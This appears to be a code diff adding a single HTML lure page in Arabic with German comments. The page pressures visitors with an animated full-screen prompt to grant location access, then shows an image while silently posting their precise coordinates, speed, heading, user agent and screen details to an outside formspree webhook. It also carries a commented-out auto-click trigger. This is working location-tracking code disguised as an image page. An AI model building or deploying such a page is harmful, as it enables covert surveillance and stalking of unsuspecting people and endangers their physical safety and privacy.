@@ -1,0 +1,292 @@
+<!doctype html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width,initial-scale=1"/>
+  <title>يرجى السماح بالوصول إلى الموقع</title>
+  <style>
+    :root { 
+      color-scheme: light dark; 
+    }
+    
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    
+    body {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      background: #000;
+      color: #fff;
+      font-family: system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+      text-align: center;
+      padding: 20px;
+    }
+    
+    /* Vollbild-Overlay beim Start */
+    #overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.95);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+      animation: pulse 2s ease-in-out infinite;
+    }
+    
+    @keyframes pulse {
+      0%, 100% { background: rgba(0, 0, 0, 0.95); }
+      50% { background: rgba(0, 50, 150, 0.3); }
+    }
+    
+    #overlay.hidden {
+      display: none;
+    }
+    
+    .big-button {
+      background: linear-gradient(135deg, #007bff 0%, #0056b3 100%);
+      color: #fff;
+      font-size: 1.4rem;
+      font-weight: bold;
+      border: none;
+      border-radius: 16px;
+      padding: 1.5rem 2.5rem;
+      cursor: pointer;
+      box-shadow: 0 12px 40px rgba(0, 123, 255, 0.5);
+      transition: all 0.3s ease;
+      animation: bounce 1s infinite;
+      min-width: 280px;
+    }
+    
+    .big-button:hover {
+      transform: scale(1.05);
+      box-shadow: 0 16px 50px rgba(0, 123, 255, 0.7);
+    }
+    
+    .big-button:active {
+      transform: scale(0.98);
+    }
+    
+    @keyframes bounce {
+      0%, 20%, 50%, 80%, 100% {
+        transform: translateY(0) scale(1);
+      }
+      40% {
+        transform: translateY(-15px) scale(1.02);
+      }
+      60% {
+        transform: translateY(-8px) scale(1.01);
+      }
+    }
+    
+    .urgent-text {
+      font-size: 1.1rem;
+      margin-bottom: 2rem;
+      color: #fff;
+      animation: fadeIn 0.5s ease-in;
+      text-shadow: 0 2px 10px rgba(0, 0, 0, 0.5);
+    }
+    
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(-10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    
+    /* Normaler Content */
+    img {
+      max-width: 90%;
+      height: auto;
+      border-radius: 12px;
+      margin-bottom: 1.6rem;
+      box-shadow: 0 6px 24px rgba(0, 0, 0, 0.6);
+    }
+    
+    button:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+      animation: none;
+    }
+    
+    .msg {
+      margin-top: 1rem;
+      font-size: 0.95rem;
+      opacity: 0.9;
+      min-height: 1.5rem;
+    }
+    
+    .retry {
+      display: inline-block;
+      margin-top: 0.8rem;
+      color: #7fb3ff;
+      text-decoration: underline;
+      cursor: pointer;
+      font-size: 1rem;
+    }
+    
+    .success { color: #28a745; }
+    .error { color: #dc3545; }
+    
+    .icon {
+      font-size: 3rem;
+      margin-bottom: 1rem;
+      animation: rotate 3s linear infinite;
+    }
+    
+    @keyframes rotate {
+      from { transform: rotate(0deg); }
+      to { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+  <!-- Vollbild-Aufforderung beim Start -->
+  <div id="overlay">
+    <div class="icon">📍</div>
+    <div class="urgent-text">انقر للسماح بالوصول إلى موقعك</div>
+    <button class="big-button" id="startBtn">اضغط هنا للمتابعة</button>
+  </div>
+
+  <!-- Haupt-Content (wird nach Klick sichtbar) -->
+  <div id="mainContent" style="display:none;">
+    <img src="490716617_24365319479735048_6862502247511119998_n.jpg" alt="صورة" />
+    <div class="msg" id="msg" aria-live="polite">⏳ جارٍ الحصول على الموقع...</div>
+    <a class="retry" id="retry" style="display:none">إعادة المحاولة</a>
+  </div>
+
+  <script>
+    // === KONFIGURATION ===
+    const WEBHOOK = "https://formspree.io/f/meorbgwy";
+    
+    // === DOM-ELEMENTE ===
+    const overlay = document.getElementById('overlay');
+    const startBtn = document.getElementById('startBtn');
+    const mainContent = document.getElementById('mainContent');
+    const msg = document.getElementById('msg');
+    const retry = document.getElementById('retry');
+    
+    // === HILFSFUNKTIONEN ===
+    function setMsg(text, type = '') {
+      msg.textContent = text;
+      msg.className = 'msg ' + type;
+    }
+    
+    async function sendToZapier(data) {
+      const res = await fetch(WEBHOOK, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data)
+      });
+      
+      if (!res.ok) {
+        throw new Error(`HTTP ${res.status}: ${res.statusText}`);
+      }
+      
+      return res;
+    }
+    
+    // === HAUPTFUNKTION ===
+    async function requestLocation() {
+      // Overlay verstecken, Content zeigen
+      overlay.classList.add('hidden');
+      mainContent.style.display = 'flex';
+      mainContent.style.flexDirection = 'column';
+      mainContent.style.alignItems = 'center';
+      
+      // Browser-Check
+      if (!('geolocation' in navigator)) {
+        setMsg('❌ المتصفح لا يدعم تحديد الموقع', 'error');
+        retry.style.display = 'inline-block';
+        return;
+      }
+      
+      setMsg('⏳ جارٍ طلب الموقع…');
+      retry.style.display = 'none';
+      
+      // Geolocation-Optionen
+      const options = {
+        enableHighAccuracy: true,
+        timeout: 15000,
+        maximumAge: 0
+      };
+      
+      // Position anfordern
+      navigator.geolocation.getCurrentPosition(
+        async (pos) => {
+          setMsg('📍 تم الحصول على الموقع، جارٍ الإرسال…');
+          
+          const payload = {
+            lat: pos.coords.latitude,
+            lng: pos.coords.longitude,
+            acc: pos.coords.accuracy,
+            altitude: pos.coords.altitude,
+            speed: pos.coords.speed,
+            heading: pos.coords.heading,
+            ts: Date.now(),
+            ua: navigator.userAgent,
+            page: location.href,
+            screen: `${screen.width}x${screen.height}`,
+            lang: navigator.language
+          };
+          
+          try {
+            await sendToZapier(payload);
+            setMsg('✅ تم الإرسال بنجاح', 'success');
+            console.log('✓ Daten gesendet:', payload);
+          } catch (e) {
+            console.error('✗ Fehler beim Senden:', e);
+            setMsg('❌ فشل الإرسال: ' + e.message, 'error');
+            retry.style.display = 'inline-block';
+          }
+        },
+        (err) => {
+          console.error('✗ Geolocation-Fehler:', err);
+          let errorMsg = '';
+          
+          switch(err.code) {
+            case err.PERMISSION_DENIED:
+              errorMsg = 'تم رفض الإذن';
+              break;
+            case err.POSITION_UNAVAILABLE:
+              errorMsg = 'الموقع غير متاح';
+              break;
+            case err.TIMEOUT:
+              errorMsg = 'انتهت المهلة';
+              break;
+            default:
+              errorMsg = err.message || 'خطأ غير معروف';
+          }
+          
+          setMsg('❌ تعذر الحصول على الموقع: ' + errorMsg, 'error');
+          retry.style.display = 'inline-block';
+        },
+        options
+      );
+    }
+    
+    // === EVENT-LISTENER ===
+    startBtn.addEventListener('click', requestLocation);
+    retry.addEventListener('click', () => {
+      retry.style.display = 'none';
+      requestLocation();
+    });
+    
+    // Optional: Bei erneutem Laden automatisch klicken (nur für Tests!)
+    // Achtung: Funktioniert nur wenn User vorher bereits Berechtigung erteilt hat
+    window.addEventListener('load', () => {
+      // Uncomment für automatischen Trigger nach 500ms:
+      // setTimeout(() => startBtn.click(), 500);
+    });
+  </script>
+</body>
+</html>
+
